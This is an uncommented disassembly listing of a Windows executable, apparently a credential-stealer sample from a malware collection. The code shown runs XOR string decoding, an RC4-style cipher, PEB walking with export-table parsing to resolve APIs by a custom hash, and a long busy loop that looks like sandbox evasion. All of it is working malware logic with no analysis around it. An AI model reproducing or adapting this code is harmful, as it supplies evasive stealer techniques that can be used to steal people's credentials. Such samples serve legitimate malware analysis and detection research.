
malware_samples/stealer/421f03c399e3bf9e2ca462094aebbbecf5e24c9907616aa90f9bc1695e18567e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	53                   	push   %ebx
  401004:	57                   	push   %edi
  401005:	56                   	push   %esi
  401006:	83 e4 f8             	and    $0xfffffff8,%esp
  401009:	81 ec a8 00 00 00    	sub    $0xa8,%esp
  40100f:	89 e6                	mov    %esp,%esi
  401011:	89 ae 90 00 00 00    	mov    %ebp,0x90(%esi)
  401017:	8d 96 98 00 00 00    	lea    0x98(%esi),%edx
  40101d:	8b 45 0c             	mov    0xc(%ebp),%eax
  401020:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401023:	89 62 fc             	mov    %esp,-0x4(%edx)
  401026:	c7 42 08 ff ff ff ff 	movl   $0xffffffff,0x8(%edx)
  40102d:	c7 42 04 f0 44 40 00 	movl   $0x4044f0,0x4(%edx)
  401034:	64 8b 3d 00 00 00 00 	mov    %fs:0x0,%edi
  40103b:	89 3a                	mov    %edi,(%edx)
  40103d:	64 89 15 00 00 00 00 	mov    %edx,%fs:0x0
  401044:	89 4e 10             	mov    %ecx,0x10(%esi)
  401047:	89 46 14             	mov    %eax,0x14(%esi)
  40104a:	b8 e1 ff ff ff       	mov    $0xffffffe1,%eax
  40104f:	c7 46 21 65 1d 74 79 	movl   $0x79741d65,0x21(%esi)
  401056:	c7 46 25 58 44 4b 5f 	movl   $0x5f4b4458,0x25(%esi)
  40105d:	c7 46 29 4f 42 74 50 	movl   $0x5074424f,0x29(%esi)
  401064:	c7 46 2d 46 52 68 46 	movl   $0x46685246,0x2d(%esi)
  40106b:	c7 46 31 40 54 67 58 	movl   $0x58675440,0x31(%esi)
  401072:	c7 46 35 0b 03 0d 0f 	movl   $0xf0d030b,0x35(%esi)
  401079:	c7 46 39 5b 0d 76 6f 	movl   $0x6f760d5b,0x39(%esi)
  401080:	66 c7 46 3d 2e 2c    	movw   $0x2c2e,0x3d(%esi)
  401086:	c6 46 3f 23          	movb   $0x23,0x3f(%esi)
  40108a:	89 c1                	mov    %eax,%ecx
  40108c:	80 c1 45             	add    $0x45,%cl
  40108f:	30 4c 06 40          	xor    %cl,0x40(%esi,%eax,1)
  401093:	40                   	inc    %eax
  401094:	75 f4                	jne    0x40108a
  401096:	31 c9                	xor    %ecx,%ecx
  401098:	8d 46 70             	lea    0x70(%esi),%eax
  40109b:	0f 57 c0             	xorps  %xmm0,%xmm0
  40109e:	c7 86 a0 00 00 00 ff 	movl   $0xffffffff,0xa0(%esi)
  4010a5:	ff ff ff 
  4010a8:	8d 7e 08             	lea    0x8(%esi),%edi
  4010ab:	89 08                	mov    %ecx,(%eax)
  4010ad:	89 48 08             	mov    %ecx,0x8(%eax)
  4010b0:	89 48 0c             	mov    %ecx,0xc(%eax)
  4010b3:	c7 40 10 07 00 00 00 	movl   $0x7,0x10(%eax)
  4010ba:	89 48 1b             	mov    %ecx,0x1b(%eax)
  4010bd:	b1 01                	mov    $0x1,%cl
  4010bf:	f2 0f 11 40 14       	movsd  %xmm0,0x14(%eax)
  4010c4:	88 48 1c             	mov    %cl,0x1c(%eax)
  4010c7:	88 48 1a             	mov    %cl,0x1a(%eax)
  4010ca:	8d 4e 21             	lea    0x21(%esi),%ecx
  4010cd:	6a 1f                	push   $0x1f
  4010cf:	51                   	push   %ecx
  4010d0:	50                   	push   %eax
  4010d1:	57                   	push   %edi
  4010d2:	e8 55 45 00 00       	call   0x40562c
  4010d7:	83 c4 10             	add    $0x10,%esp
  4010da:	80 3f 04             	cmpb   $0x4,(%edi)
  4010dd:	0f 85 9d 00 00 00    	jne    0x401180
  4010e3:	8b 46 0c             	mov    0xc(%esi),%eax
  4010e6:	c7 86 a0 00 00 00 00 	movl   $0x0,0xa0(%esi)
  4010ed:	00 00 00 
  4010f0:	89 46 04             	mov    %eax,0x4(%esi)
  4010f3:	e8 98 cb 00 00       	call   0x40dc90
  4010f8:	8d 56 40             	lea    0x40(%esi),%edx
  4010fb:	89 02                	mov    %eax,(%edx)
  4010fd:	f2 0f 10 40 08       	movsd  0x8(%eax),%xmm0
  401102:	f2 0f 11 46 58       	movsd  %xmm0,0x58(%esi)
  401107:	f0 ff 08             	lock decl (%eax)
  40110a:	75 0c                	jne    0x401118
  40110c:	52                   	push   %edx
  40110d:	e8 ce f9 00 00       	call   0x410ae0
  401112:	8d 56 40             	lea    0x40(%esi),%edx
  401115:	83 c4 04             	add    $0x4,%esp
  401118:	8d 46 58             	lea    0x58(%esi),%eax
  40111b:	8d 4e 60             	lea    0x60(%esi),%ecx
  40111e:	c7 46 40 68 d2 42 00 	movl   $0x42d268,0x40(%esi)
  401125:	c7 46 44 03 00 00 00 	movl   $0x3,0x44(%esi)
  40112c:	c7 46 50 00 00 00 00 	movl   $0x0,0x50(%esi)
  401133:	89 01                	mov    %eax,(%ecx)
  401135:	8d 46 10             	lea    0x10(%esi),%eax
  401138:	c7 41 04 9f 44 40 00 	movl   $0x40449f,0x4(%ecx)
  40113f:	89 4e 48             	mov    %ecx,0x48(%esi)
  401142:	c7 46 4c 02 00 00 00 	movl   $0x2,0x4c(%esi)
  401149:	89 41 08             	mov    %eax,0x8(%ecx)
  40114c:	c7 41 0c c7 65 41 00 	movl   $0x4165c7,0xc(%ecx)
  401153:	8d 46 04             	lea    0x4(%esi),%eax
  401156:	8d 4e 18             	lea    0x18(%esi),%ecx
  401159:	52                   	push   %edx
  40115a:	50                   	push   %eax
  40115b:	51                   	push   %ecx
  40115c:	e8 9b 45 00 00       	call   0x4056fc
  401161:	83 c4 0c             	add    $0xc,%esp
  401164:	80 7e 18 04          	cmpb   $0x4,0x18(%esi)
  401168:	74 08                	je     0x401172
  40116a:	8d 4e 18             	lea    0x18(%esi),%ecx
  40116d:	e8 c5 30 00 00       	call   0x404237
  401172:	ff 76 04             	push   0x4(%esi)
  401175:	e8 c2 ad 01 00       	call   0x41bf3c
  40117a:	80 7e 08 04          	cmpb   $0x4,0x8(%esi)
  40117e:	74 12                	je     0x401192
  401180:	8d 4e 08             	lea    0x8(%esi),%ecx
  401183:	c7 86 a0 00 00 00 ff 	movl   $0xffffffff,0xa0(%esi)
  40118a:	ff ff ff 
  40118d:	e8 fb 32 00 00       	call   0x40448d
  401192:	8b 86 98 00 00 00    	mov    0x98(%esi),%eax
  401198:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40119e:	8d 65 f4             	lea    -0xc(%ebp),%esp
  4011a1:	5e                   	pop    %esi
  4011a2:	5f                   	pop    %edi
  4011a3:	5b                   	pop    %ebx
  4011a4:	5d                   	pop    %ebp
  4011a5:	c3                   	ret
  4011a6:	55                   	push   %ebp
  4011a7:	83 ec 10             	sub    $0x10,%esp
  4011aa:	8d b5 5c ff ff ff    	lea    -0xa4(%ebp),%esi
  4011b0:	8b ae 90 00 00 00    	mov    0x90(%esi),%ebp
  4011b6:	ff 76 04             	push   0x4(%esi)
  4011b9:	e8 7e ad 01 00       	call   0x41bf3c
  4011be:	80 7e 08 04          	cmpb   $0x4,0x8(%esi)
  4011c2:	75 05                	jne    0x4011c9
  4011c4:	83 c4 10             	add    $0x10,%esp
  4011c7:	5d                   	pop    %ebp
  4011c8:	c3                   	ret
  4011c9:	8d 4e 08             	lea    0x8(%esi),%ecx
  4011cc:	e8 bc 32 00 00       	call   0x40448d
  4011d1:	eb f1                	jmp    0x4011c4
  4011d3:	53                   	push   %ebx
  4011d4:	57                   	push   %edi
  4011d5:	56                   	push   %esi
  4011d6:	e8 67 ad 01 00       	call   0x41bf42
  4011db:	89 c7                	mov    %eax,%edi
  4011dd:	e8 66 ad 01 00       	call   0x41bf48
  4011e2:	89 c6                	mov    %eax,%esi
  4011e4:	01 fe                	add    %edi,%esi
  4011e6:	6a 4e                	push   $0x4e
  4011e8:	e8 a3 ad 01 00       	call   0x41bf90
  4011ed:	89 c3                	mov    %eax,%ebx
  4011ef:	e8 5a ad 01 00       	call   0x41bf4e
  4011f4:	89 c7                	mov    %eax,%edi
  4011f6:	01 df                	add    %ebx,%edi
  4011f8:	01 f7                	add    %esi,%edi
  4011fa:	e8 97 ad 01 00       	call   0x41bf96
  4011ff:	89 c6                	mov    %eax,%esi
  401201:	e8 4e ad 01 00       	call   0x41bf54
  401206:	01 f0                	add    %esi,%eax
  401208:	01 f8                	add    %edi,%eax
  40120a:	5e                   	pop    %esi
  40120b:	5f                   	pop    %edi
  40120c:	5b                   	pop    %ebx
  40120d:	c3                   	ret
  40120e:	55                   	push   %ebp
  40120f:	53                   	push   %ebx
  401210:	57                   	push   %edi
  401211:	56                   	push   %esi
  401212:	81 ec 08 01 00 00    	sub    $0x108,%esp
  401218:	8d 44 24 08          	lea    0x8(%esp),%eax
  40121c:	89 14 24             	mov    %edx,(%esp)
  40121f:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  401223:	68 00 01 00 00       	push   $0x100
  401228:	6a 00                	push   $0x0
  40122a:	50                   	push   %eax
  40122b:	e8 d0 ba 01 00       	call   0x41cd00
  401230:	83 c4 0c             	add    $0xc,%esp
  401233:	b8 00 ff ff ff       	mov    $0xffffff00,%eax
  401238:	89 c1                	mov    %eax,%ecx
  40123a:	80 c1 b1             	add    $0xb1,%cl
  40123d:	88 8c 04 08 01 00 00 	mov    %cl,0x108(%esp,%eax,1)
  401244:	40                   	inc    %eax
  401245:	75 f1                	jne    0x401238
  401247:	b8 00 ff ff ff       	mov    $0xffffff00,%eax
  40124c:	80 84 04 08 01 00 00 	addb   $0x4f,0x108(%esp,%eax,1)
  401253:	4f 
  401254:	40                   	inc    %eax
  401255:	75 f5                	jne    0x40124c
  401257:	31 c0                	xor    %eax,%eax
  401259:	31 c9                	xor    %ecx,%ecx
  40125b:	8a 54 0c 08          	mov    0x8(%esp,%ecx,1),%dl
  40125f:	89 cb                	mov    %ecx,%ebx
  401261:	83 e3 1f             	and    $0x1f,%ebx
  401264:	00 d0                	add    %dl,%al
  401266:	02 83 20 d2 42 00    	add    0x42d220(%ebx),%al
  40126c:	0f b6 d8             	movzbl %al,%ebx
  40126f:	8a 74 1c 08          	mov    0x8(%esp,%ebx,1),%dh
  401273:	88 74 0c 08          	mov    %dh,0x8(%esp,%ecx,1)
  401277:	41                   	inc    %ecx
  401278:	88 54 1c 08          	mov    %dl,0x8(%esp,%ebx,1)
  40127c:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  401282:	75 d7                	jne    0x40125b
  401284:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401288:	8b 84 24 1c 01 00 00 	mov    0x11c(%esp),%eax
  40128f:	74 73                	je     0x401304
  401291:	8b 68 08             	mov    0x8(%eax),%ebp
  401294:	f7 1c 24             	negl   (%esp)
  401297:	31 db                	xor    %ebx,%ebx
  401299:	31 d2                	xor    %edx,%edx
  40129b:	43                   	inc    %ebx
  40129c:	0f b6 c3             	movzbl %bl,%eax
  40129f:	89 de                	mov    %ebx,%esi
  4012a1:	8a 4c 04 08          	mov    0x8(%esp,%eax,1),%cl
  4012a5:	00 ca                	add    %cl,%dl
  4012a7:	89 d7                	mov    %edx,%edi
  4012a9:	0f b6 d2             	movzbl %dl,%edx
  4012ac:	8a 6c 14 08          	mov    0x8(%esp,%edx,1),%ch
  4012b0:	88 6c 04 08          	mov    %ch,0x8(%esp,%eax,1)
  4012b4:	88 4c 14 08          	mov    %cl,0x8(%esp,%edx,1)
  4012b8:	02 4c 04 08          	add    0x8(%esp,%eax,1),%cl
  4012bc:	8b 44 24 04          	mov    0x4(%esp),%eax
  4012c0:	8a 5c 18 ff          	mov    -0x1(%eax,%ebx,1),%bl
  4012c4:	0f b6 c1             	movzbl %cl,%eax
  4012c7:	8b 8c 24 1c 01 00 00 	mov    0x11c(%esp),%ecx
  4012ce:	32 5c 04 08          	xor    0x8(%esp,%eax,1),%bl
  4012d2:	3b 29                	cmp    (%ecx),%ebp
  4012d4:	75 10                	jne    0x4012e6
  4012d6:	51                   	push   %ecx
  4012d7:	e8 44 a7 02 00       	call   0x42ba20
  4012dc:	8b 8c 24 20 01 00 00 	mov    0x120(%esp),%ecx
  4012e3:	83 c4 04             	add    $0x4,%esp
  4012e6:	8b 41 04             	mov    0x4(%ecx),%eax
  4012e9:	c0 c3 06             	rol    $0x6,%bl
  4012ec:	89 fa                	mov    %edi,%edx
  4012ee:	88 1c 28             	mov    %bl,(%eax,%ebp,1)
  4012f1:	8b 04 24             	mov    (%esp),%eax
  4012f4:	89 f3                	mov    %esi,%ebx
  4012f6:	45                   	inc    %ebp
  4012f7:	43                   	inc    %ebx
  4012f8:	89 69 08             	mov    %ebp,0x8(%ecx)
  4012fb:	8d 44 30 01          	lea    0x1(%eax,%esi,1),%eax
  4012ff:	83 f8 01             	cmp    $0x1,%eax
  401302:	75 98                	jne    0x40129c
  401304:	81 c4 08 01 00 00    	add    $0x108,%esp
  40130a:	5e                   	pop    %esi
  40130b:	5f                   	pop    %edi
  40130c:	5b                   	pop    %ebx
  40130d:	5d                   	pop    %ebp
  40130e:	c3                   	ret
  40130f:	55                   	push   %ebp
  401310:	89 e5                	mov    %esp,%ebp
  401312:	53                   	push   %ebx
  401313:	57                   	push   %edi
  401314:	56                   	push   %esi
  401315:	83 ec 54             	sub    $0x54,%esp
  401318:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40131b:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  40131e:	89 55 ac             	mov    %edx,-0x54(%ebp)
  401321:	89 60 fc             	mov    %esp,-0x4(%eax)
  401324:	c7 40 08 ff ff ff ff 	movl   $0xffffffff,0x8(%eax)
  40132b:	c7 40 04 00 45 40 00 	movl   $0x404500,0x4(%eax)
  401332:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  401339:	89 08                	mov    %ecx,(%eax)
  40133b:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401341:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  401347:	c7 45 c0 00 00 00 00 	movl   $0x0,-0x40(%ebp)
  40134e:	8b 40 30             	mov    0x30(%eax),%eax
  401351:	8b 78 0c             	mov    0xc(%eax),%edi
  401354:	8b 5f 14             	mov    0x14(%edi),%ebx
  401357:	83 c7 14             	add    $0x14,%edi
  40135a:	39 fb                	cmp    %edi,%ebx
  40135c:	75 14                	jne    0x401372
  40135e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401361:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  401367:	8b 45 c0             	mov    -0x40(%ebp),%eax
  40136a:	83 c4 54             	add    $0x54,%esp
  40136d:	5e                   	pop    %esi
  40136e:	5f                   	pop    %edi
  40136f:	5b                   	pop    %ebx
  401370:	5d                   	pop    %ebp
  401371:	c3                   	ret
  401372:	89 7d bc             	mov    %edi,-0x44(%ebp)
  401375:	8b 53 10             	mov    0x10(%ebx),%edx
  401378:	85 d2                	test   %edx,%edx
  40137a:	0f 84 ba 01 00 00    	je     0x40153a
  401380:	0f b7 73 24          	movzwl 0x24(%ebx),%esi
  401384:	8b 4b 28             	mov    0x28(%ebx),%ecx
  401387:	85 f6                	test   %esi,%esi
  401389:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  40138c:	0f 94 c0             	sete   %al
  40138f:	85 c9                	test   %ecx,%ecx
  401391:	0f 94 c1             	sete   %cl
  401394:	08 c1                	or     %al,%cl
  401396:	0f 85 9e 01 00 00    	jne    0x40153a
  40139c:	89 f1                	mov    %esi,%ecx
  40139e:	89 55 dc             	mov    %edx,-0x24(%ebp)
  4013a1:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  4013a8:	d1 e9                	shr    $1,%ecx
  4013aa:	31 c0                	xor    %eax,%eax
  4013ac:	40                   	inc    %eax
  4013ad:	50                   	push   %eax
  4013ae:	50                   	push   %eax
  4013af:	6a 00                	push   $0x0
  4013b1:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4013b4:	51                   	push   %ecx
  4013b5:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4013b8:	50                   	push   %eax
  4013b9:	e8 77 36 00 00       	call   0x404a35
  4013be:	83 c4 14             	add    $0x14,%esp
  4013c1:	31 c9                	xor    %ecx,%ecx
  4013c3:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  4013c6:	41                   	inc    %ecx
  4013c7:	39 4d a0             	cmp    %ecx,-0x60(%ebp)
  4013ca:	0f 84 b4 01 00 00    	je     0x401584
  4013d0:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4013d3:	66 83 fe 02          	cmp    $0x2,%si
  4013d7:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4013da:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  4013dd:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  4013e0:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  4013e7:	0f 82 38 01 00 00    	jb     0x401525
  4013ed:	8b 7d e0             	mov    -0x20(%ebp),%edi
  4013f0:	31 f6                	xor    %esi,%esi
  4013f2:	01 ff                	add    %edi,%edi
  4013f4:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4013f7:	0f b7 04 70          	movzwl (%eax,%esi,2),%eax
  4013fb:	66 85 c0             	test   %ax,%ax
  4013fe:	74 4b                	je     0x40144b
  401400:	89 c2                	mov    %eax,%edx
  401402:	8d 48 bf             	lea    -0x41(%eax),%ecx
  401405:	80 ca 20             	or     $0x20,%dl
  401408:	66 83 f9 1a          	cmp    $0x1a,%cx
  40140c:	0f b6 ca             	movzbl %dl,%ecx
  40140f:	0f 43 c8             	cmovae %eax,%ecx
  401412:	3b 75 c4             	cmp    -0x3c(%ebp),%esi
  401415:	75 25                	jne    0x40143c
  401417:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40141a:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401421:	50                   	push   %eax
  401422:	89 75 d4             	mov    %esi,-0x2c(%ebp)
  401425:	89 7d e0             	mov    %edi,-0x20(%ebp)
  401428:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  40142b:	e8 f0 a5 02 00       	call   0x42ba20
  401430:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401433:	8b 7d e0             	mov    -0x20(%ebp),%edi
  401436:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  401439:	83 c4 04             	add    $0x4,%esp
  40143c:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40143f:	88 0c 30             	mov    %cl,(%eax,%esi,1)
  401442:	46                   	inc    %esi
  401443:	83 c7 fe             	add    $0xfffffffe,%edi
  401446:	89 75 cc             	mov    %esi,-0x34(%ebp)
  401449:	75 a9                	jne    0x4013f4
  40144b:	85 f6                	test   %esi,%esi
  40144d:	0f 84 d2 00 00 00    	je     0x401525
  401453:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  401456:	b8 d3 61 8b b7       	mov    $0xb78b61d3,%eax
  40145b:	0f b6 11             	movzbl (%ecx),%edx
  40145e:	85 d2                	test   %edx,%edx
  401460:	74 13                	je     0x401475
  401462:	8d 84 10 ba 00 00 00 	lea    0xba(%eax,%edx,1),%eax
  401469:	41                   	inc    %ecx
  40146a:	35 f4 59 05 50       	xor    $0x500559f4,%eax
  40146f:	c1 c0 09             	rol    $0x9,%eax
  401472:	4e                   	dec    %esi
  401473:	75 e6                	jne    0x40145b
  401475:	3b 45 b0             	cmp    -0x50(%ebp),%eax
  401478:	0f 85 a7 00 00 00    	jne    0x401525
  40147e:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401481:	8b 41 3c             	mov    0x3c(%ecx),%eax
  401484:	8b 44 01 78          	mov    0x78(%ecx,%eax,1),%eax
  401488:	85 c0                	test   %eax,%eax
  40148a:	0f 84 b9 00 00 00    	je     0x401549
  401490:	8b 4c 08 18          	mov    0x18(%eax,%ecx,1),%ecx
  401494:	85 c9                	test   %ecx,%ecx
  401496:	89 4d d0             	mov    %ecx,-0x30(%ebp)
  401499:	0f 84 86 00 00 00    	je     0x401525
  40149f:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4014a2:	31 db                	xor    %ebx,%ebx
  4014a4:	8b 74 08 20          	mov    0x20(%eax,%ecx,1),%esi
  4014a8:	8b 54 08 14          	mov    0x14(%eax,%ecx,1),%edx
  4014ac:	8b 7c 08 1c          	mov    0x1c(%eax,%ecx,1),%edi
  4014b0:	8b 44 08 24          	mov    0x24(%eax,%ecx,1),%eax
  4014b4:	01 ce                	add    %ecx,%esi
  4014b6:	01 c8                	add    %ecx,%eax
  4014b8:	89 55 d4             	mov    %edx,-0x2c(%ebp)
  4014bb:	89 7d b4             	mov    %edi,-0x4c(%ebp)
  4014be:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4014c1:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4014c4:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4014c7:	8b 0c 98             	mov    (%eax,%ebx,4),%ecx
  4014ca:	03 4d dc             	add    -0x24(%ebp),%ecx
  4014cd:	31 c0                	xor    %eax,%eax
  4014cf:	31 ff                	xor    %edi,%edi
  4014d1:	40                   	inc    %eax
  4014d2:	48                   	dec    %eax
  4014d3:	80 3c 39 00          	cmpb   $0x0,(%ecx,%edi,1)
  4014d7:	89 fa                	mov    %edi,%edx
  4014d9:	74 0b                	je     0x4014e6
  4014db:	8d 7a 01             	lea    0x1(%edx),%edi
  4014de:	81 fa 00 01 00 00    	cmp    $0x100,%edx
  4014e4:	72 ec                	jb     0x4014d2
  4014e6:	85 c0                	test   %eax,%eax
  4014e8:	74 35                	je     0x40151f
  4014ea:	bf d3 61 8b b7       	mov    $0xb78b61d3,%edi
  4014ef:	31 c0                	xor    %eax,%eax
  4014f1:	0f b6 34 01          	movzbl (%ecx,%eax,1),%esi
  4014f5:	85 f6                	test   %esi,%esi
  4014f7:	74 15                	je     0x40150e
  4014f9:	8d bc 37 ba 00 00 00 	lea    0xba(%edi,%esi,1),%edi
  401500:	40                   	inc    %eax
  401501:	81 f7 f4 59 05 50    	xor    $0x500559f4,%edi
  401507:	c1 c7 09             	rol    $0x9,%edi
  40150a:	39 c2                	cmp    %eax,%edx
  40150c:	75 e3                	jne    0x4014f1
  40150e:	3b 7d ac             	cmp    -0x54(%ebp),%edi
  401511:	75 0c                	jne    0x40151f
  401513:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401516:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  40151a:	39 45 d4             	cmp    %eax,-0x2c(%ebp)
  40151d:	77 43                	ja     0x401562
  40151f:	43                   	inc    %ebx
  401520:	3b 5d d0             	cmp    -0x30(%ebp),%ebx
  401523:	75 9f                	jne    0x4014c4
  401525:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  401528:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  40152f:	e8 c9 2d 00 00       	call   0x4042fd
  401534:	8b 7d bc             	mov    -0x44(%ebp),%edi
  401537:	8b 5d b8             	mov    -0x48(%ebp),%ebx
  40153a:	8b 1b                	mov    (%ebx),%ebx
  40153c:	39 fb                	cmp    %edi,%ebx
  40153e:	0f 85 31 fe ff ff    	jne    0x401375
  401544:	e9 15 fe ff ff       	jmp    0x40135e
  401549:	8b 5d b8             	mov    -0x48(%ebp),%ebx
  40154c:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40154f:	8b 1b                	mov    (%ebx),%ebx
  401551:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  401558:	e8 a0 2d 00 00       	call   0x4042fd
  40155d:	8b 7d bc             	mov    -0x44(%ebp),%edi
  401560:	eb da                	jmp    0x40153c
  401562:	8b 75 dc             	mov    -0x24(%ebp),%esi
  401565:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  401568:	01 f1                	add    %esi,%ecx
  40156a:	03 34 81             	add    (%ecx,%eax,4),%esi
  40156d:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  401570:	c7 45 f0 ff ff ff ff 	movl   $0xffffffff,-0x10(%ebp)
  401577:	e8 81 2d 00 00       	call   0x4042fd
  40157c:	89 75 c0             	mov    %esi,-0x40(%ebp)
  40157f:	e9 da fd ff ff       	jmp    0x40135e
  401584:	ff 75 a8             	push   -0x58(%ebp)
  401587:	50                   	push   %eax
  401588:	e8 33 a4 02 00       	call   0x42b9c0
  40158d:	55                   	push   %ebp
  40158e:	83 ec 14             	sub    $0x14,%esp
  401591:	83 c5 0c             	add    $0xc,%ebp
  401594:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  401597:	e8 61 2d 00 00       	call   0x4042fd
  40159c:	83 c4 14             	add    $0x14,%esp
  40159f:	5d                   	pop    %ebp
  4015a0:	c3                   	ret
  4015a1:	55                   	push   %ebp
  4015a2:	53                   	push   %ebx
  4015a3:	57                   	push   %edi
  4015a4:	56                   	push   %esi
  4015a5:	83 ec 28             	sub    $0x28,%esp
  4015a8:	bd 46 25 00 00       	mov    $0x2546,%ebp
  4015ad:	bb 91 19 00 00       	mov    $0x1991,%ebx
  4015b2:	31 f6                	xor    %esi,%esi
  4015b4:	31 c9                	xor    %ecx,%ecx
  4015b6:	31 ff                	xor    %edi,%edi
  4015b8:	31 c0                	xor    %eax,%eax
  4015ba:	31 d2                	xor    %edx,%edx
  4015bc:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4015c3:	00 
  4015c4:	c7 44 24 08 56 14 00 	movl   $0x1456,0x8(%esp)
  4015cb:	00 
  4015cc:	c7 44 24 0c ac 1e 00 	movl   $0x1eac,0xc(%esp)
  4015d3:	00 
  4015d4:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4015db:	00 
  4015dc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4015e3:	83 c0 01             	add    $0x1,%eax
  4015e6:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4015ea:	83 d2 00             	adc    $0x0,%edx
  4015ed:	89 44 24 20          	mov    %eax,0x20(%esp)
  4015f1:	89 f0                	mov    %esi,%eax
  4015f3:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  4015f7:	8b 54 24 04          	mov    0x4(%esp),%edx
  4015fb:	0f a4 e8 0b          	shld   $0xb,%ebp,%eax
  4015ff:	0f a4 f5 0b          	shld   $0xb,%esi,%ebp
  401603:	8b 34 24             	mov    (%esp),%esi
  401606:	81 f2 ea 2f f5 c0    	xor    $0xc0f52fea,%edx
  40160c:	81 f6 05 f2 b0 0b    	xor    $0xbb0f205,%esi
  401612:	01 d5                	add    %edx,%ebp
  401614:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401618:	11 c6                	adc    %eax,%esi
  40161a:	89 e8                	mov    %ebp,%eax
  40161c:	89 6c 24 24          	mov    %ebp,0x24(%esp)
  401620:	0f af cd             	imul   %ebp,%ecx
  401623:	89 74 24 18          	mov    %esi,0x18(%esp)
  401627:	0f af f2             	imul   %edx,%esi
  40162a:	f7 e2                	mul    %edx
  40162c:	89 d5                	mov    %edx,%ebp
  40162e:	8b 54 24 10          	mov    0x10(%esp),%edx
  401632:	01 cd                	add    %ecx,%ebp
  401634:	01 f5                	add    %esi,%ebp
  401636:	29 d8                	sub    %ebx,%eax
  401638:	8b 74 24 08          	mov    0x8(%esp),%esi
  40163c:	89 c1                	mov    %eax,%ecx
  40163e:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401642:	19 d5                	sbb    %edx,%ebp
  401644:	89 eb                	mov    %ebp,%ebx
  401646:	0f a4 e9 14          	shld   $0x14,%ebp,%ecx
  40164a:	0f a4 c3 14          	shld   $0x14,%eax,%ebx
  40164e:	01 f3                	add    %esi,%ebx
  401650:	11 f9                	adc    %edi,%ecx
  401652:	33 5c 24 14          	xor    0x14(%esp),%ebx
  401656:	31 ca                	xor    %ecx,%edx
  401658:	b9 24 dd 35 fb       	mov    $0xfb35dd24,%ecx
  40165d:	89 54 24 10          	mov    %edx,0x10(%esp)
  401661:	01 de                	add    %ebx,%esi
  401663:	89 f0                	mov    %esi,%eax
  401665:	11 d7                	adc    %edx,%edi
  401667:	f7 e1                	mul    %ecx
  401669:	69 ce 14 92 38 46    	imul   $0x46389214,%esi,%ecx
  40166f:	69 ff 24 dd 35 fb    	imul   $0xfb35dd24,%edi,%edi
  401675:	8b 74 24 18          	mov    0x18(%esp),%esi
  401679:	01 d1                	add    %edx,%ecx
  40167b:	89 44 24 08          	mov    %eax,0x8(%esp)
  40167f:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401683:	8b 44 24 20          	mov    0x20(%esp),%eax
  401687:	01 cf                	add    %ecx,%edi
  401689:	81 7c 24 04 50 6e 1a 	cmpl   $0x1a6e50,0x4(%esp)
  401690:	00 
  401691:	89 e9                	mov    %ebp,%ecx
  401693:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  401697:	89 44 24 04          	mov    %eax,0x4(%esp)
  40169b:	83 1c 24 00          	sbbl   $0x0,(%esp)
  40169f:	89 14 24             	mov    %edx,(%esp)
  4016a2:	0f 82 3b ff ff ff    	jb     0x4015e3
  4016a8:	53                   	push   %ebx
  4016a9:	e8 ac a8 01 00       	call   0x41bf5a
  4016ae:	83 c4 28             	add    $0x28,%esp
  4016b1:	5e                   	pop    %esi
  4016b2:	5f                   	pop    %edi
  4016b3:	5b                   	pop    %ebx
  4016b4:	5d                   	pop    %ebp
  4016b5:	c3                   	ret
  4016b6:	55                   	push   %ebp
  4016b7:	53                   	push   %ebx
  4016b8:	57                   	push   %edi
  4016b9:	56                   	push   %esi
